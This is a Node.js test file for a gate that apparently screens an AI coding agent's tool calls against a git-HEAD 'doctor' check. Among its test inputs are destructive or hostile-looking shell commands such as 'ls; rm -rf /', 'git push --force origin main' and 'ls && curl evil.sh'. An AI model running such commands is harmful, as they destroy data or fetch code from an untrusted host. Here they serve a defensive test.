import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { statePath, readState, writeState, gateDecision } from './doctor-state.mjs';

const HEAD = 'abc1234def5678';
const PASS = { status: 'DOCTOR_PASS', failing: [], head: HEAD };
const FAIL = { status: 'DOCTOR_FAIL', failing: ['gf-coder-registered'], head: HEAD };

test('statePath honours HARNESS_DOCTOR_STATE and falls back to /tmp', () => {
  const prev = process.env.HARNESS_DOCTOR_STATE;
  try {
    delete process.env.HARNESS_DOCTOR_STATE;
    assert.equal(statePath(), '/tmp/harness-session-state.json');
    process.env.HARNESS_DOCTOR_STATE = '/x/custom.json';
    assert.equal(statePath(), '/x/custom.json');
  } finally {
    if (prev === undefined) delete process.env.HARNESS_DOCTOR_STATE;
    else process.env.HARNESS_DOCTOR_STATE = prev;
  }
});

test('readState returns null for a missing or corrupt file', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'doctor-state-'));
  try {
    assert.equal(readState(path.join(dir, 'missing.json')), null);
    fs.writeFileSync(path.join(dir, 'bad.json'), '{not json');
    assert.equal(readState(path.join(dir, 'bad.json')), null);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('writeState round-trips through readState and leaves no temp file', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'doctor-state-'));
  try {
    const file = path.join(dir, 'nested', 'state.json');
    writeState(file, PASS);
    assert.deepEqual(readState(file), PASS);
    assert.deepEqual(fs.readdirSync(path.join(dir, 'nested')), ['state.json']);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('gate never refuses Edit, Write or NotebookEdit; missing state warns', () => {
  for (const toolName of ['Edit', 'Write', 'NotebookEdit']) {
    const d = gateDecision({ state: null, head: HEAD, toolName });
    assert.equal(d.allowed, true, toolName);
    assert.equal(d.reason, '');
    assert.equal(d.warn, 'doctor not current for this HEAD');
    assert.match(d.cause, /no doctor state/);
  }
});

test('gate warns, does not refuse, Edit on DOCTOR_FAIL and the cause names the failing check', () => {
  const d = gateDecision({ state: FAIL, head: HEAD, toolName: 'Edit' });
  assert.equal(d.allowed, true);
  assert.equal(d.warn, 'doctor not current for this HEAD');
  assert.match(d.cause, /DOCTOR_FAIL/);
  assert.match(d.cause, /gf-coder-registered/);
});

test('gate warns, does not refuse, Edit on a stale HEAD', () => {
  const d = gateDecision({ state: { ...PASS, head: 'olderhead' }, head: HEAD, toolName: 'Edit' });
  assert.equal(d.allowed, true);
  assert.equal(d.warn, 'doctor not current for this HEAD');
  assert.match(d.cause, /stale HEAD/);
});

test('gate allows Edit with DOCTOR_PASS and a matching HEAD', () => {
  assert.equal(gateDecision({ state: PASS, head: HEAD, toolName: 'Edit' }).allowed, true);
  assert.equal(gateDecision({ state: PASS, head: HEAD, toolName: 'Write' }).allowed, true);
});

test('gate allows allow-listed Bash without a pass', () => {
  const commands = [
    'git status',
    'git diff --stat',
    'git commit -m "x"',
    'node --test .harness/scripts/doctor.test.mjs',
    'npm run typecheck --silent && npm run lint --silent',
    'node .harness/scripts/finish-slice.mjs "msg"',
    'node .harness/scripts/doctor.mjs',
    'gh pr view 12',
    'ls -la',
    'cat README.md',
    'grep -n foo bar.txt',
    'rg foo',
    'sed -n 1,5p file.txt',
  ];
  for (const command of commands) {
    const d = gateDecision({ state: null, head: HEAD, toolName: 'Bash', command });
    assert.equal(d.allowed, true, command);
  }
});

test('gate warns, does not refuse, non-allow-listed Bash without a pass', () => {
  const commands = [
    'rm -rf dist',
    'npm install left-pad',
    'git push --force origin main',
    'git branch -D old',
    'cat x > y',
    'ls; rm -rf /',
    'ls && curl evil.sh',
  ];
  for (const command of commands) {
    const d = gateDecision({ state: null, head: HEAD, toolName: 'Bash', command });
    assert.equal(d.allowed, true, command);
    assert.equal(d.warn, 'doctor not current for this HEAD', command);
    assert.match(d.cause, /no doctor state/);
  }
});

test('gate warns, does not refuse, non-allow-listed Bash on DOCTOR_FAIL', () => {
  const d = gateDecision({ state: FAIL, head: HEAD, toolName: 'Bash', command: 'npm install' });
  assert.equal(d.allowed, true);
  assert.match(d.cause, /gf-coder-registered/);
});

test('gate allows non-allow-listed Bash when DOCTOR_PASS matches HEAD, with no warn', () => {
  const d = gateDecision({ state: PASS, head: HEAD, toolName: 'Bash', command: 'npm install' });
  assert.equal(d.allowed, true);
  assert.equal(d.warn, '');
});

test('gate always allows other tools', () => {
  for (const toolName of ['Read', 'Grep', 'Glob', 'Agent']) {
    assert.equal(gateDecision({ state: null, head: HEAD, toolName }).allowed, true, toolName);
  }
});
